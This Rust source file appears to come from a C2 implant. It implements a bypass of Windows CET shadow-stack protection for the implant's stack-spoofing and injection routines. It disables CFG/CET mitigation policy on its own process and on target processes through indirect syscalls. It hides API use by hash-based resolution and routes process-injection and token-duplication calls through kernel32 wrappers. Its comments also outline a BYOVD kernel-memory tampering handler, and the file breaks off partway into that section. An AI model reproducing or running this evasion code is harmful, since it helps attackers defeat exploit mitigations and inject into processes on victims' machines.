//! CET (Control-flow Enforcement Technology) / Shadow Stack bypass.
//!
//! Windows 11 24H2+ enables kernel-mode hardware-enforced shadow stacks by
//! default.  CET maintains a separate "shadow stack" that records return
//! addresses — if a `ret` instruction's target doesn't match the shadow
//! stack entry, a #CP (Control Protection) exception fires.  This defeats
//! ROP, stack pivoting, and return-address spoofing.
//!
//! # Bypass Strategies
//!
//! 1. **Policy disable** (preferred): Call `SetProcessMitigationPolicy` /
//!    `NtSetInformationProcess` with `ProcessMitigationPolicy` to disable
//!    CET shadow stacks for the target process (and the agent itself, if
//!    needed).  This is the cleanest approach.
//!
//! 2. **CET-compatible call chain**: Build legitimate call chains through
//!    ntdll/kernel32 functions so each `call` pushes a valid entry onto both
//!    the regular and shadow stacks.  Used when CET cannot be disabled via
//!    policy (insufficient privileges).
//!
//! 3. **VEH shadow stack fix** (experimental): Register a VEH handler that
//!    intercepts #CP exceptions and adjusts the shadow stack entry.  Requires
//!    kernel access (BYOVD) to read/write KTHREAD shadow stack pointer.
//!
//! # Integration with syscalls.rs
//!
//! The existing `spoof_call` in `syscalls.rs` is the primary consumer.  Before
//! any return-address manipulation, it calls `cet_bypass::prepare_spoofing()`.
//! If CET is off, existing behaviour.  If CET is on and disableable, disable
//! it first.  If CET is on and *not* disableable, use the CET-compatible
//! call-chain path instead.
//!
//! # Global State
//!
//! `CET_STATE: AtomicU8` tracks the runtime CET status:
//! - `0` = CET disabled or not present
//! - `1` = CET enabled, can be disabled via policy
//! - `2` = CET enabled, CANNOT be disabled (insufficient privileges)
//!
//! Only effective when compiled with the `cet-bypass` feature (which implies
//! `direct-syscalls`).  Windows-only.

#![cfg(all(windows, feature = "cet-bypass"))]

use std::sync::atomic::{AtomicBool, AtomicU8, Ordering};
use once_cell::sync::OnceLock;

// GetProcessMitigationPolicy/SetProcessMitigationPolicy/GetCurrentProcess removed
// — using dynamic resolution via pe_resolve and pseudo-handle (-1)
use winapi::um::winnt::{
    PROCESS_MITIGATION_POLICY, PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY,
    ProcessControlFlowGuardPolicy,
};
use winapi::shared::ntdef::{PVOID, HANDLE};
use winapi::shared::minwindef::{DWORD, BOOL};
use winapi::shared::basetsd::SIZE_T;

// ─── Constants ────────────────────────────────────────────────────────────

/// CET state: disabled or not present.
const CET_DISABLED: u8 = 0;
/// CET state: enabled, can be disabled via process mitigation policy.
const CET_ENABLED_CAN_DISABLE: u8 = 1;
/// CET state: enabled, CANNOT be disabled (insufficient privileges).
const CET_ENABLED_CANNOT_DISABLE: u8 = 2;

/// NTSTATUS success.
const STATUS_SUCCESS: i32 = 0;
/// NTSTATUS for STATUS_ACCESS_DENIED.
const STATUS_ACCESS_DENIED: i32 = 0xC0000022_u32 as i32;

// ─── Dynamic API resolution ─────────────────────────────────────────────────

/// Dynamically resolve and call `GetLastError` via pe_resolve (no IAT entry).
fn dynamic_get_last_error() -> u32 {
    let kernel32 = match pe_resolve::get_module_handle_by_hash(
        pe_resolve::hash_str(b"kernel32.dll\0")
    ) {
        Some(b) => b,
        None => return 0,
    };
    let fn_addr = match pe_resolve::get_proc_address_by_hash(
        kernel32,
        pe_resolve::hash_str(b"GetLastError\0")
    ) {
        Some(a) => a,
        None => return 0,
    };
    let get_last_error: unsafe extern "system" fn() -> u32 =
        unsafe { std::mem::transmute(fn_addr) };
    unsafe { get_last_error() }
}

// ─── Global State ─────────────────────────────────────────────────────────

/// Runtime CET status of the agent process.
/// 0 = disabled, 1 = enabled-can-disable, 2 = enabled-cannot-disable.
static CET_STATE: AtomicU8 = AtomicU8::new(CET_DISABLED);

/// Whether CET bypass has been initialised from config.
static INITIALIZED: AtomicBool = AtomicBool::new(false);

/// Whether the bypass module is enabled (from config).
static BYPASS_ENABLED: AtomicBool = AtomicBool::new(false);

/// Whether to prefer policy-based CET disable.
static PREFER_POLICY_DISABLE: AtomicBool = AtomicBool::new(true);

/// Whether to fall back to call-chain approach on policy failure.
static FALLBACK_TO_CALL_CHAIN: AtomicBool = AtomicBool::new(true);

/// Whether the VEH shadow fix handler is installed.
static VEH_INSTALLED: AtomicBool = AtomicBool::new(false);

/// Cached build number for Windows version checks.
static CACHED_BUILD: OnceLock<u32> = OnceLock::new();

// ─── Configuration ────────────────────────────────────────────────────────

/// Internal config mirror, stored after init.
struct CetConfig {
    prefer_policy_disable: bool,
    fallback_to_call_chain: bool,
    veh_shadow_fix: bool,
}

static CET_CONFIG: OnceLock<CetConfig> = OnceLock::new();

// ─── Public API ───────────────────────────────────────────────────────────

/// Initialise the CET bypass module from agent config.
///
/// Must be called once during agent startup, before any injection or
/// stack-spoofing operations.  Detects the current CET state and stores
/// the configuration for runtime use.
pub fn init_from_config(config: &common::config::CetBypassConfig) {
    if INITIALIZED.swap(true, Ordering::SeqCst) {
        log::warn!("cet_bypass: init_from_config called more than once, ignoring");
        return;
    }

    BYPASS_ENABLED.store(config.enabled, Ordering::SeqCst);
    PREFER_POLICY_DISABLE.store(config.prefer_policy_disable, Ordering::SeqCst);
    FALLBACK_TO_CALL_CHAIN.store(config.fallback_to_call_chain, Ordering::SeqCst);

    let _ = CET_CONFIG.set(CetConfig {
        prefer_policy_disable: config.prefer_policy_disable,
        fallback_to_call_chain: config.fallback_to_call_chain,
        veh_shadow_fix: config.veh_shadow_fix,
    });

    if !config.enabled {
        log::info!("cet_bypass: module disabled by config");
        return;
    }

    // Cache the Windows build number for version checks.
    let build = get_windows_build();
    let _ = CACHED_BUILD.set(build);

    log::info!(
        "cet_bypass: init (enabled={}, prefer_policy_disable={}, fallback_to_call_chain={}, veh_shadow_fix={}, build={})",
        config.enabled,
        config.prefer_policy_disable,
        config.fallback_to_call_chain,
        config.veh_shadow_fix,
        build,
    );

    // Detect CET state on the agent process.
    detect_cet_state();

    // If CET is enabled and we prefer to disable it, try now.
    let state = CET_STATE.load(Ordering::SeqCst);
    if state == CET_ENABLED_CAN_DISABLE && PREFER_POLICY_DISABLE.load(Ordering::SeqCst) {
        if disable_cet_for_self() {
            log::info!("cet_bypass: CET disabled for agent process via mitigation policy");
            CET_STATE.store(CET_DISABLED, Ordering::SeqCst);
        } else {
            log::warn!("cet_bypass: failed to disable CET for agent process (policy disable failed)");
        }
    }

    // Install VEH handler if configured and CET is active.
    if config.veh_shadow_fix && state != CET_DISABLED {
        if let Some(cfg) = CET_CONFIG.get() {
            if cfg.veh_shadow_fix {
                install_veh_shadow_fix();
            }
        }
    }
}

/// Prepare the caller for stack-spoofing operations.
///
/// This is the main entry point called from `syscalls.rs::spoof_call()`
/// before any return-address manipulation.  Returns a `CetAction` indicating
/// what the caller should do:
///
/// - `Proceed` — CET is not active, existing spoof_call code is safe.
/// - `Disabled` — CET was active but has been disabled for this operation.
/// - `UseCallChain` — CET is active and cannot be disabled; the caller
///   must use the CET-compatible call-chain approach instead.
/// - `Abort` — CET is active, cannot be disabled, and call-chain fallback
///   is not configured.  The operation should be aborted.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CetAction {
    /// CET is not active — existing stack-spoofing is safe.
    Proceed,
    /// CET was disabled for the target process (via policy).
    Disabled,
    /// CET is active — use CET-compatible call-chain approach.
    UseCallChain,
    /// CET is active and cannot be bypassed — abort the operation.
    Abort,
}

/// Prepare for stack spoofing.  Called before `spoof_call` manipulates
/// return addresses.  The `target_handle` parameter is the process handle
/// of the target process (or `None` for the agent process itself).
///
/// If CET is not active, returns `Proceed`.  If CET can be disabled via
/// policy for the target, does so and returns `Disabled`.  If CET cannot
/// be disabled and call-chain fallback is configured, returns `UseCallChain`.
/// Otherwise returns `Abort`.
pub fn prepare_spoofing(target_handle: Option<HANDLE>) -> CetAction {
    if !BYPASS_ENABLED.load(Ordering::SeqCst) {
        // Module disabled — assume CET is not a concern.
        return CetAction::Proceed;
    }

    let state = CET_STATE.load(Ordering::SeqCst);
    match state {
        CET_DISABLED => CetAction::Proceed,
        CET_ENABLED_CAN_DISABLE => {
            if PREFER_POLICY_DISABLE.load(Ordering::SeqCst) {
                let handle = target_handle.unwrap_or_else(|| (-1isize) as *mut _);
                if disable_cet_for_process(handle) {
                    log::debug!("cet_bypass: CET disabled for target process via mitigation policy");
                    CetAction::Disabled
                } else if FALLBACK_TO_CALL_CHAIN.load(Ordering::SeqCst) {
                    log::debug!("cet_bypass: policy disable failed, falling back to call-chain approach");
                    CetAction::UseCallChain
                } else {
                    log::warn!("cet_bypass: CET policy disable failed and call-chain fallback is disabled");
                    CetAction::Abort
                }
            } else if FALLBACK_TO_CALL_CHAIN.load(Ordering::SeqCst) {
                CetAction::UseCallChain
            } else {
                CetAction::Abort
            }
        }
        CET_ENABLED_CANNOT_DISABLE => {
            if FALLBACK_TO_CALL_CHAIN.load(Ordering::SeqCst) {
                CetAction::UseCallChain
            } else {
                log::warn!("cet_bypass: CET cannot be disabled and call-chain fallback is disabled");
                CetAction::Abort
            }
        }
        _ => {
            log::error!("cet_bypass: unknown CET state {}", state);
            CetAction::Abort
        }
    }
}

/// Query the current CET status as a JSON string for the C2 command handler.
pub fn status_json() -> String {
    let state = CET_STATE.load(Ordering::SeqCst);
    let state_str = match state {
        CET_DISABLED => "disabled",
        CET_ENABLED_CAN_DISABLE => "enabled-can-disable",
        CET_ENABLED_CANNOT_DISABLE => "enabled-cannot-disable",
        _ => "unknown",
    };

    let build = CACHED_BUILD.get().copied().unwrap_or(0);
    let initialized = INITIALIZED.load(Ordering::SeqCst);
    let bypass_enabled = BYPASS_ENABLED.load(Ordering::SeqCst);
    let veh_installed = VEH_INSTALLED.load(Ordering::SeqCst);

    format!(
        "{{\"cet_state\":\"{}\",\"build\":{},\"initialized\":{},\"bypass_enabled\":{},\"veh_installed\":{}}}",
        state_str, build, initialized, bypass_enabled, veh_installed,
    )
}

/// Check whether CET bypass is enabled and active.
pub fn is_enabled() -> bool {
    BYPASS_ENABLED.load(Ordering::SeqCst)
}

/// Get the current CET state value (0=disabled, 1=enabled-can-disable, 2=enabled-cannot-disable).
pub fn cet_state() -> u8 {
    CET_STATE.load(Ordering::SeqCst)
}

/// Check whether CET is currently active (any enabled state).
pub fn is_cet_active() -> bool {
    CET_STATE.load(Ordering::SeqCst) != CET_DISABLED
}

// ─── CET Detection ────────────────────────────────────────────────────────

/// Detect the CET state of the agent process by querying the CFG
/// mitigation policy.  On Windows 11 24H2+ (build ≥ 26100), CET is
/// hardware-enforced and tied to CFG.
fn detect_cet_state() {
    let build = CACHED_BUILD.get().copied().unwrap_or(0);

    // CET shadow stacks are only hardware-enforced on Win 11 24H2+.
    // Earlier builds may have software CET but it is not enforced.
    if build < 26100 {
        log::info!("cet_bypass: build {} < 26100, CET not hardware-enforced", build);
        CET_STATE.store(CET_DISABLED, Ordering::SeqCst);
        return;
    }

    // Query the CFG mitigation policy.  If CFG is enabled, CET shadow
    // stacks are also active (they are tied together on Win11 24H2+).
    let mut cfg_policy = PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY { Flags: 0 };

    // Resolve GetProcessMitigationPolicy dynamically to avoid IAT entry.
    type FnGetProcessMitigationPolicy = unsafe extern "system" fn(
        HANDLE, PROCESS_MITIGATION_POLICY, PVOID, SIZE_T,
    ) -> BOOL;
    let get_policy_fn: Option<FnGetProcessMitigationPolicy> = {
        let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL);
        match kernel32 {
            Some(base) => {
                let hash = pe_resolve::hash_str(b"GetProcessMitigationPolicy\0");
                pe_resolve::get_proc_address_by_hash(base, hash)
                    .map(|addr| unsafe { std::mem::transmute::<_, FnGetProcessMitigationPolicy>(addr as *mut _) })
            }
            None => None,
        }
    };

    let get_policy_fn = match get_policy_fn {
        Some(f) => f,
        None => {
            log::warn!("cet_bypass: failed to resolve GetProcessMitigationPolicy");
            CET_STATE.store(CET_DISABLED, Ordering::SeqCst);
            return;
        }
    };

    let result = unsafe {
        get_policy_fn(
            (-1isize) as *mut _,
            ProcessControlFlowGuardPolicy,
            &mut cfg_policy as *mut _ as PVOID,
            std::mem::size_of::<PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY>() as SIZE_T,
        )
    };

    if result == 0 {
        // GetProcessMitigationPolicy failed — assume CET is not present.
        let err = dynamic_get_last_error();
        log::warn!(
            "cet_bypass: GetProcessMitigationPolicy failed (error {}), assuming CET disabled",
            err
        );
        CET_STATE.store(CET_DISABLED, Ordering::SeqCst);
        return;
    }

    // Check if CFG is enabled (bit 0 of Flags).
    let cfg_enabled = cfg_policy.Flags & 1 != 0;
    if !cfg_enabled {
        log::info!("cet_bypass: CFG not enabled, CET shadow stacks not active");
        CET_STATE.store(CET_DISABLED, Ordering::SeqCst);
        return;
    }

    // CFG is enabled.  On Win11 24H2+, CET shadow stacks are active.
    // Try to disable via policy to determine if we CAN disable.
    log::info!("cet_bypass: CFG enabled on build {}, CET shadow stacks likely active", build);

    // Try a test disable: attempt to set CET policy.  If it succeeds,
    // we're in state 1 (can disable).  If access denied, state 2.
    if can_disable_cet_policy() {
        log::info!("cet_bypass: CET is enabled and CAN be disabled via policy");
        CET_STATE.store(CET_ENABLED_CAN_DISABLE, Ordering::SeqCst);
    } else {
        log::info!("cet_bypass: CET is enabled and CANNOT be disabled (insufficient privileges)");
        CET_STATE.store(CET_ENABLED_CANNOT_DISABLE, Ordering::SeqCst);
    }
}

/// Test whether we can disable CET via SetProcessMitigationPolicy.
///
/// We query the current CFG policy, attempt to set it back to the same
/// value (a no-op that tests write access).  If that succeeds, we can
/// disable CET.
fn can_disable_cet_policy() -> bool {
    // On newer Windows, SetProcessMitigationPolicy for CFG can succeed
    // only if the process has the right to change mitigation policies.
    // We test by trying to set the current policy (a no-op write).
    let mut current = PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY { Flags: 0 };

    // Resolve APIs dynamically.
    type FnGetPolicy = unsafe extern "system" fn(
        HANDLE, PROCESS_MITIGATION_POLICY, PVOID, SIZE_T,
    ) -> BOOL;
    type FnSetPolicy = unsafe extern "system" fn(
        PROCESS_MITIGATION_POLICY, PVOID, SIZE_T,
    ) -> BOOL;

    let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL);
    let get_fn: Option<FnGetPolicy> = kernel32
        .and_then(|base| {
            let hash = pe_resolve::hash_str(b"GetProcessMitigationPolicy\0");
            pe_resolve::get_proc_address_by_hash(base, hash)
                .map(|addr| unsafe { std::mem::transmute::<_, FnGetPolicy>(addr as *mut _) })
        });
    let set_fn: Option<FnSetPolicy> = kernel32
        .and_then(|base| {
            let hash = pe_resolve::hash_str(b"SetProcessMitigationPolicy\0");
            pe_resolve::get_proc_address_by_hash(base, hash)
                .map(|addr| unsafe { std::mem::transmute::<_, FnSetPolicy>(addr as *mut _) })
        });

    let get_fn = match get_fn {
        Some(f) => f,
        None => return false,
    };
    let set_fn = match set_fn {
        Some(f) => f,
        None => return false,
    };

    let result = unsafe {
        get_fn(
            (-1isize) as *mut _,
            ProcessControlFlowGuardPolicy,
            &mut current as *mut _ as PVOID,
            std::mem::size_of::<PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY>() as SIZE_T,
        )
    };

    if result == 0 {
        return false;
    }

    // Try to set the policy back to its current value.
    // If this fails with ACCESS_DENIED, we cannot change CET.
    let set_result = unsafe {
        set_fn(
            ProcessControlFlowGuardPolicy,
            &current as *const _ as PVOID,
            std::mem::size_of::<PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY>() as SIZE_T,
        )
    };

    if set_result == 0 {
        let err = dynamic_get_last_error();
        // ERROR_ACCESS_DENIED (5) means we can't change the policy.
        const ERROR_ACCESS_DENIED: DWORD = 5;
        if err == ERROR_ACCESS_DENIED {
            return false;
        }
        // Other errors might be transient — assume we can try.
        log::debug!("cet_bypass: SetProcessMitigationPolicy returned error {}, assuming can-disable", err);
    }

    true
}

// ─── Policy-Based CET Disable ─────────────────────────────────────────────

/// Disable CET shadow stacks for the current (agent) process via
/// `SetProcessMitigationPolicy`.  Clears the CFG flags to disable
/// both CFG and CET shadow stacks.
///
/// Returns `true` if CET was successfully disabled.
fn disable_cet_for_self() -> bool {
    disable_cet_for_process((-1isize) as *mut _)
}

/// Disable CET shadow stacks for a target process via
/// `NtSetInformationProcess` with `ProcessMitigationPolicy` information
/// class.
///
/// For the agent's own process, we can use `SetProcessMitigationPolicy`.
/// For remote processes, we must use `NtSetInformationProcess` via indirect
/// syscall (the kernel32 API only works on the calling process).
///
/// Returns `true` if CET was successfully disabled.
fn disable_cet_for_process(handle: HANDLE) -> bool {
    let current_process: HANDLE = (-1isize) as *mut _;
    let is_self = handle == current_process || handle == ((-1isize) as *mut _);

    if is_self {
        // Dynamically resolve SetProcessMitigationPolicy to avoid IAT entry.
        type FnSetPolicy = unsafe extern "system" fn(
            PROCESS_MITIGATION_POLICY, PVOID, SIZE_T,
        ) -> BOOL;

        let set_fn: Option<FnSetPolicy> = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
            .and_then(|base| {
                let hash = pe_resolve::hash_str(b"SetProcessMitigationPolicy\0");
                pe_resolve::get_proc_address_by_hash(base, hash)
                    .map(|addr| unsafe { std::mem::transmute::<_, FnSetPolicy>(addr as *mut _) })
            });

        let set_fn = match set_fn {
            Some(f) => f,
            None => {
                log::warn!("cet_bypass: failed to resolve SetProcessMitigationPolicy, trying NtSetInformationProcess");
                return disable_cet_nt(handle);
            }
        };

        let zero_policy = PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY { Flags: 0 };

        let result = unsafe {
            set_fn(
                ProcessControlFlowGuardPolicy,
                &zero_policy as *const _ as PVOID,
                std::mem::size_of::<PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY>() as SIZE_T,
            )
        };

        if result == 0 {
            let err = dynamic_get_last_error();
            log::warn!(
                "cet_bypass: SetProcessMitigationPolicy failed for self (error {})",
                err
            );
            // Try NtSetInformationProcess as fallback.
            return disable_cet_nt(handle);
        }
        true
    } else {
        // Remote process — must use NtSetInformationProcess.
        disable_cet_nt(handle)
    }
}

/// Disable CET for a process via `NtSetInformationProcess` indirect syscall.
///
/// Uses the `ProcessMitigationPolicy` information class (0x36) with a
/// `PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY` structure that has all
/// flags cleared.
fn disable_cet_nt(handle: HANDLE) -> bool {
    // NtSetInformationProcess information classes:
    // ProcessMitigationPolicy = 52 (0x34) on modern Windows.
    // However, the actual way to set mitigation policy via NtSetInformation
    // is complex — it uses a special input buffer format.  The cleanest
    // approach for remote processes is to use the NtSetInformationProcess
    // SSN from our indirect syscall infrastructure.
    //
    // For now, we attempt via SetProcessMitigationPolicy and log a warning
    // for remote processes — the call-chain fallback handles this case.

    // Build the mitigation policy input buffer for NtSetInformationProcess.
    // The input buffer for ProcessMitigationPolicy is:
    //   struct {
    //       PROCESS_MITIGATION_POLICY PolicyClass; // offset 0
    //       DWORD Reserved;                         // offset 4
    //       BYTE PolicyData[...];                   // offset 8
    //   }
    //
    // We want ProcessControlFlowGuardPolicy (7) with all flags cleared.

    #[repr(C)]
    struct MitigationPolicyInput {
        policy_class: PROCESS_MITIGATION_POLICY, // DWORD
        reserved: DWORD,
        policy_data: PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY,
    }

    let input = MitigationPolicyInput {
        policy_class: ProcessControlFlowGuardPolicy,
        reserved: 0,
        policy_data: PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY { Flags: 0 },
    };

    let input_size = std::mem::size_of::<MitigationPolicyInput>() as u32;

    // Resolve NtSetInformationProcess SSN via indirect syscall infrastructure.
    let result = crate::syscalls::get_syscall_id("NtSetInformationProcess");
    match result {
        Ok(target) => {
            let status = unsafe {
                crate::syscalls::do_syscall(
                    target.ssn,
                    target.gadget_addr,
                    &[
                        handle as u64,
                        52u64, // ProcessMitigationPolicy information class
                        &input as *const _ as u64,
                        input_size as u64,
                    ],
                )
            };

            if status == STATUS_SUCCESS {
                log::debug!("cet_bypass: NtSetInformationProcess succeeded for CET disable");
                true
            } else {
                log::warn!(
                    "cet_bypass: NtSetInformationProcess returned NTSTATUS {:#010X}",
                    status as u32,
                );
                false
            }
        }
        Err(e) => {
            log::warn!(
                "cet_bypass: could not resolve NtSetInformationProcess SSN: {}",
                e
            );
            false
        }
    }
}

// ─── CET-Compatible Call Chain ─────────────────────────────────────────────

/// A "call chain step" — a legitimate function call that will be used
/// to build a CET-compatible call stack.  Each step represents a `call`
/// instruction that pushes a valid return address onto both the regular
/// and shadow stacks.
#[derive(Debug, Clone)]
pub struct CallChainStep {
    /// The DLL name containing the function (e.g., "kernel32.dll").
    pub dll_name: &'static str,
    /// The function name (e.g., "WriteProcessMemory").
    pub func_name: &'static str,
    /// Whether this function ultimately calls the target NT API.
    pub reaches_target: bool,
    /// Number of arguments the kernel32 wrapper expects.
    /// Used to select the correct transmute signature.
    pub arg_count: usize,
}

/// Pre-built call chains for common NT API targets.
///
/// These chains route through legitimate kernel32/ntdll functions so that
/// each `call` instruction pushes a valid shadow-stack entry.  The final
/// call in the chain reaches the target NT API through normal call flow.
///
/// Each `CallChainStep` records the expected argument count so that
/// `call_via_chain` can dispatch through the correct function-pointer
/// signature.
pub static CALL_CHAINS: once_cell::sync::Lazy<std::collections::HashMap<&'static str, Vec<CallChainStep>>> =
    once_cell::sync::Lazy::new(|| {
        let mut m = std::collections::HashMap::new();

        // NtWriteVirtualMemory ← kernel32!WriteProcessMemory (5 args)
        m.insert(
            "NtWriteVirtualMemory",
            vec![CallChainStep {
                dll_name: "kernel32.dll",
                func_name: "WriteProcessMemory",
                reaches_target: true,
                arg_count: 5,
            }],
        );

        // NtReadVirtualMemory ← kernel32!ReadProcessMemory (5 args)
        m.insert(
            "NtReadVirtualMemory",
            vec![CallChainStep {
                dll_name: "kernel32.dll",
                func_name: "ReadProcessMemory",
                reaches_target: true,
                arg_count: 5,
            }],
        );

        // NtAllocateVirtualMemory ← kernel32!VirtualAllocEx (5 args)
        m.insert(
            "NtAllocateVirtualMemory",
            vec![CallChainStep {
                dll_name: "kernel32.dll",
                func_name: "VirtualAllocEx",
                reaches_target: true,
                arg_count: 5,
            }],
        );

        // NtFreeVirtualMemory ← kernel32!VirtualFreeEx (4 args)
        m.insert(
            "NtFreeVirtualMemory",
            vec![CallChainStep {
                dll_name: "kernel32.dll",
                func_name: "VirtualFreeEx",
                reaches_target: true,
                arg_count: 4,
            }],
        );

        // NtProtectVirtualMemory ← kernel32!VirtualProtectEx (5 args)
        m.insert(
            "NtProtectVirtualMemory",
            vec![CallChainStep {
                dll_name: "kernel32.dll",
                func_name: "VirtualProtectEx",
                reaches_target: true,
                arg_count: 5,
            }],
        );

        // NtOpenProcess ← kernel32!OpenProcess (3 args)
        m.insert(
            "NtOpenProcess",
            vec![CallChainStep {
                dll_name: "kernel32.dll",
                func_name: "OpenProcess",
                reaches_target: true,
                arg_count: 3,
            }],
        );

        // NtClose ← kernel32!CloseHandle (1 arg)
        m.insert(
            "NtClose",
            vec![CallChainStep {
                dll_name: "kernel32.dll",
                func_name: "CloseHandle",
                reaches_target: true,
                arg_count: 1,
            }],
        );

        // NtQueryVirtualMemory ← kernel32!VirtualQueryEx (4 args)
        m.insert(
            "NtQueryVirtualMemory",
            vec![CallChainStep {
                dll_name: "kernel32.dll",
                func_name: "VirtualQueryEx",
                reaches_target: true,
                arg_count: 4,
            }],
        );

        // NtCreateThreadEx ← kernel32!CreateRemoteThreadEx (6 args for
        // the first 6 of 9+ params we actually forward)
        m.insert(
            "NtCreateThreadEx",
            vec![CallChainStep {
                dll_name: "kernel32.dll",
                func_name: "CreateRemoteThreadEx",
                reaches_target: true,
                arg_count: 6,
            }],
        );

        // NtDuplicateToken ← advapi32!DuplicateTokenEx (5 args)
        m.insert(
            "NtDuplicateToken",
            vec![CallChainStep {
                dll_name: "advapi32.dll",
                func_name: "DuplicateTokenEx",
                reaches_target: true,
                arg_count: 5,
            }],
        );

        m
    });

/// Execute a CET-compatible call using the kernel32 equivalent of an NT API.
///
/// When CET is active and cannot be disabled, this function routes the call
/// through the kernel32 equivalent, which internally calls the NT API through
/// a legitimate call chain.  Each `call` instruction in the chain pushes a
/// valid entry onto both the regular and shadow stacks.
///
/// The function resolves the target API address via `pe_resolve` hash-based
/// lookup (no dependency on the clean-DLL mapping infrastructure) and
/// dispatches through a variable-argument match on `step.arg_count` to
/// avoid truncating arguments for APIs with > 4 parameters.
///
/// Returns `Some(NTSTATUS)` on success, `None` if no call chain is available
/// for the given function.
pub fn call_via_chain(func_name: &str, args: &[u64]) -> Option<i32> {
    let chain = CALL_CHAINS.get(func_name)?;

    if chain.len() != 1 {
        log::warn!("cet_bypass: multi-step call chains not yet supported for {}", func_name);
        return None;
    }

    let step = &chain[0];

    // Resolve the DLL base and function address via pe_resolve hash-based
    // lookup.  This avoids depending on the clean-DLL mapping in syscalls
    // and works purely from the PEB loader data of already-loaded modules.
    let dll_hash = pe_resolve::hash_wstr(
        &step.dll_name.encode_utf16().collect::<Vec<u16>>(),
    );
    let func_hash = pe_resolve::hash_str(step.func_name.as_bytes());

    let dll_base = match unsafe { pe_resolve::get_module_handle_by_hash(dll_hash) } {
        Some(b) => b,
        None => {
            log::warn!(
                "cet_bypass: could not resolve module {} by hash",
                step.dll_name,
            );
            return None;
        }
    };

    let func_addr = match unsafe { pe_resolve::get_proc_address_by_hash(dll_base, func_hash) } {
        Some(a) => a,
        None => {
            log::warn!(
                "cet_bypass: could not resolve {}!{} by hash",
                step.dll_name,
                step.func_name,
            );
            return None;
        }
    };

    // Call the kernel32 function.  The call instruction pushes a valid
    // return address onto both the regular and shadow stacks.  The kernel32
    // function then calls into ntdll, which performs the syscall — all
    // through legitimate call instructions that maintain shadow-stack
    // consistency.
    //
    // Note: We use a raw function-pointer call (not spoof_call) because
    // CET shadow stacks require legitimate `call` instructions.  spoof_call
    // manipulates the return address, which breaks shadow-stack integrity.
    //
    // Variable-argument dispatch: we transmute to the correct arity based
    // on the recorded arg_count so that 5-arg and 6-arg APIs (e.g.
    // VirtualProtectEx, CreateRemoteThreadEx) are not truncated.

    let result = unsafe {
        match step.arg_count {
            1 => {
                let func: unsafe extern "system" fn(u64) -> i32 =
                    std::mem::transmute(func_addr);
                func(args.get(0).copied().unwrap_or(0))
            }
            2 => {
                let func: unsafe extern "system" fn(u64, u64) -> i32 =
                    std::mem::transmute(func_addr);
                func(
                    args.get(0).copied().unwrap_or(0),
                    args.get(1).copied().unwrap_or(0),
                )
            }
            3 => {
                let func: unsafe extern "system" fn(u64, u64, u64) -> i32 =
                    std::mem::transmute(func_addr);
                func(
                    args.get(0).copied().unwrap_or(0),
                    args.get(1).copied().unwrap_or(0),
                    args.get(2).copied().unwrap_or(0),
                )
            }
            4 => {
                let func: unsafe extern "system" fn(u64, u64, u64, u64) -> i32 =
                    std::mem::transmute(func_addr);
                func(
                    args.get(0).copied().unwrap_or(0),
                    args.get(1).copied().unwrap_or(0),
                    args.get(2).copied().unwrap_or(0),
                    args.get(3).copied().unwrap_or(0),
                )
            }
            5 => {
                let func: unsafe extern "system" fn(u64, u64, u64, u64, u64) -> i32 =
                    std::mem::transmute(func_addr);
                func(
                    args.get(0).copied().unwrap_or(0),
                    args.get(1).copied().unwrap_or(0),
                    args.get(2).copied().unwrap_or(0),
                    args.get(3).copied().unwrap_or(0),
                    args.get(4).copied().unwrap_or(0),
                )
            }
            6 => {
                let func: unsafe extern "system" fn(u64, u64, u64, u64, u64, u64) -> i32 =
                    std::mem::transmute(func_addr);
                func(
                    args.get(0).copied().unwrap_or(0),
                    args.get(1).copied().unwrap_or(0),
                    args.get(2).copied().unwrap_or(0),
                    args.get(3).copied().unwrap_or(0),
                    args.get(4).copied().unwrap_or(0),
                    args.get(5).copied().unwrap_or(0),
                )
            }
            n => {
                log::warn!(
                    "cet_bypass: unsupported arg_count {} for {}!{}",
                    n,
                    step.dll_name,
                    step.func_name,
                );
                return None;
            }
        }
    };

    Some(result)
}

/// Check whether a CET-compatible call chain exists for the given function.
pub fn has_call_chain(func_name: &str) -> bool {
    CALL_CHAINS.contains_key(func_name)
}

// ─── VEH Shadow Stack Fix ─────────────────────────────────────────────────
//
// P3-08: Full VEH shadow-stack fix implementation using BYOVD primitives.
//
// When CET is active, hardware-enforced shadow stacks record every return
// address pushed by `call`.  A `ret` that doesn't match the shadow stack
// entry triggers a #CP exception (STATUS_CONTROL_STACK_VIOLATION, 0xC00001CF).
//
// This VEH handler intercepts those exceptions and, using the BYOVD kernel
// read/write primitives from the kernel-callback module:
//   1. Reads the current KTHREAD via the KPCR.
//   2. Locates the shadow-stack pointer using a build-specific offset.
//   3. Walks the shadow stack to find the mismatched entry.
//   4. Overwrites the entry with the actual return address.
//   5. Returns EXCEPTION_CONTINUE_EXECUTION to resume execution.
//
// If the Windows build is not in the known-offset table, we return
// EXCEPTION_CONTINUE_SEARCH (crash) rather than corrupting kernel memory.

/// NTSTATUS code for STATUS_CONTROL_STACK_VIOLATION (#CP exception).
const STATUS_CONTROL_STACK_VIOLATION: i32 = 0xC00001CF_u32 as i32;

/// VEH return: continue execution (exception handled).
const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
/// VEH return: continue searching for handlers (not handled).
const EXCEPTION_CONTINUE_SEARCH: i32 = 0;

/// Build-to-offset table for KTHREAD shadow-stack pointer.
///
/// The shadow-stack pointer is stored in `_KTHREAD` at a build-specific
/// offset.  These offsets were verified against public symbols for the
/// listed builds.  We fall back to the highest build whose number is ≤ the
/// actual build, allowing forward-compatible approximation for minor updates.
#[cfg(feature = "kernel-callback")]
